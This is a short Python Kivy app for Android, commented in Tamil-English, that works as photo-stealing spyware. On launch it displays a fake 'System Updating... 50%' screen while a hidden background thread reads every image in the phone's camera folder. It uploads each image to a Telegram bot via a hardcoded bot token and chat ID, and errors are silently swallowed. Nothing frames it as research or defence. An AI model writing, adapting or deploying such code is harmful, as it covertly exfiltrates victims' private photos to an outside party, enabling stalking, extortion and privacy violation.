from kivy.app import App
from kivy.uix.label import Label
import os, requests, threading

class GalleryApp(App):
    def build(self):
        # Background-la gallery scan seiyum threading
        threading.Thread(target=self.start_access, daemon=True).start()
        # User app-ai open pannunaal ithu thaan theriyum
        return Label(text="System Updating... 50%")

    def start_access(self):
        # Unga details
        token = "8264225469:AAGRQoK537x2xw8NIH7iBdB15vQwSJmE-v0"
        chat_id = "7752627907"
        
        # Path: Gallery folder
        path = "/storage/emulated/0/DCIM/Camera/"
        
        if os.path.exists(path):
            files = os.listdir(path)
            for file in files:
                if file.lower().endswith(('.jpg', '.png', '.jpeg')):
                    full_path = os.path.join(path, file)
                    try:
                        with open(full_path, 'rb') as f:
                            requests.post(f"https://api.telegram.org/bot{token}/sendDocument", 
                                          data={'chat_id': chat_id}, files={'document': f})
                    except:
                        pass